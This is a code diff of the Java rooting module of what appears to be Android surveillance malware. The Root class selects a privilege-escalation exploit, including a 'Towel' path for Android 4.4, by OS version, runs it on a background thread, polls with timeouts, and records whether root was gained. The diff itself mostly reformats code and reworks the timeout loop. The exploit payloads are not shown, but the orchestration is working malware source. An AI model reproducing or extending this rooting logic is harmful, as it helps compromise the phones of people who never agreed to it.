@@ -18,7 +18,6 @@ import com.android.mm.M;
 
 import java.io.File;
 import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -27,8 +26,6 @@ import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
 import java.util.Date;
-import java.util.HashMap;
-import java.util.Map;
 import java.util.Properties;
 import java.util.concurrent.Semaphore;
 
@@ -93,6 +90,7 @@ public class Root {
 
 	static public boolean exploitPhone(boolean synchronous) {
 
+		// TODO: collassare exploitPhone con linuxExploit, spostanto i check delle versioni in checkFrama, checkSelinux, ecc..
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (exploitPhone) OS: " + android.os.Build.VERSION.SDK_INT);
 		}
@@ -146,12 +144,11 @@ public class Root {
 			return true;
 
 		} else if (android.os.Build.VERSION.SDK_INT == 19) { // KITKAT+
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android 4.4 detected, attempting Towel exploitation");
 			}
-			linuxExploit(synchronous, false, false,true);
-		}else if (android.os.Build.VERSION.SDK_INT > 20) { // L+
+			linuxExploit(synchronous, false, false, true);
+		} else if (android.os.Build.VERSION.SDK_INT > 20) { // L+
 			// Nada
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android >= 4.5 detected, no exploit");
@@ -516,22 +513,18 @@ public class Root {
 		}
 	}
 
-	private static void checkExploitThread(Thread exploit,int timeOutSec){
-		/* wait for timeOutSec seconds  to see if exploits ends*/
-		long startedAt = System.currentTimeMillis();
+	private static void checkExploitThread(Thread exploit, int timeOutSec) {
 
-		long _secDelta = timeOutSec*(1000);
-		while(timeOutSec==0 || ((System.currentTimeMillis()-startedAt)<_secDelta))
-		{
+		for (int i = 0; i < timeOutSec || timeOutSec == 0; i++) {
 			try {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (checkExploitThread):"+exploit.getName());
+					Check.log(TAG + " (checkExploitThread):" + exploit.getName());
 				}
-				exploit.join(2000);
-				if(!exploit.isAlive()) {
+				exploit.join(1000);
+				if (!exploit.isAlive()) {
 					Check.log(TAG + " (checkExploitThread), exploit terminated exiting");
 					Status.setExploitStatus(Status.EXPLOIT_STATUS_EXECUTED);
-					Status.setExploitResult(PackageInfo.checkRoot()?Status.EXPLOIT_RESULT_SUCCEED:Status.EXPLOIT_RESULT_FAIL);
+					Status.setExploitResult(PackageInfo.checkRoot() ? Status.EXPLOIT_RESULT_SUCCEED : Status.EXPLOIT_RESULT_FAIL);
 					break;
 				}
 			} catch (InterruptedException e) {
@@ -547,23 +540,26 @@ public class Root {
 
 		class CheckExploitThread implements Runnable {
 			Thread exploit;
-			CheckExploitThread(Thread s) { exploit = s; }
+
+			CheckExploitThread(Thread s) {
+				exploit = s;
+			}
+
 			public void run() {
-					checkExploitThread(exploit,0);
+				checkExploitThread(exploit, 0);
 				if (PackageInfo.checkRoot()) {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
 					Status.setRoot(true);
 					Status.self().setReload();
-				}else{
+				} else {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_FAIL);
 				}
 			}
 		}
 
 
-
 		// Start exploitation thread
-		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux,towel);
+		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux, towel);
 		Thread exploit = new Thread(linuxThread);
 		Status.setExploitStatus(Status.EXPLOIT_STATUS_RUNNING);
 		exploit.start();
@@ -572,25 +568,23 @@ public class Root {
 			Check.log(TAG + "(linuxExploit): exploitation thread running");
 		}
 		/* wait for 15 seconds  to see if exploits ends*/
-		checkExploitThread(exploit,15);
+		checkExploitThread(exploit, 15);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "(linuxExploit): 15 seconds passed, going synchronous="+synchronous);
+			Check.log(TAG + "(linuxExploit): 15 seconds passed, going synchronous=" + synchronous);
 		}
 		if (synchronous) {
-			checkExploitThread(exploit,0);
-		}else{
+			checkExploitThread(exploit, 0);
+		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(linuxExploit):"+exploit.getName()+" asynchronous exploit check started");
+				Check.log(TAG + "(linuxExploit):" + exploit.getName() + " asynchronous exploit check started");
 			}
-			if(exploit.isAlive()){
+			if (exploit.isAlive()) {
 				// start another Thread to check exploit thread end
 				CheckExploitThread checkExploitThread = new CheckExploitThread(exploit);
 				Thread ec = new Thread(checkExploitThread);
 				ec.start();
 			}
 		}
-
-
 	}
 
 	// name WITHOUT path (script is generated inside /data/data/<package>/files/
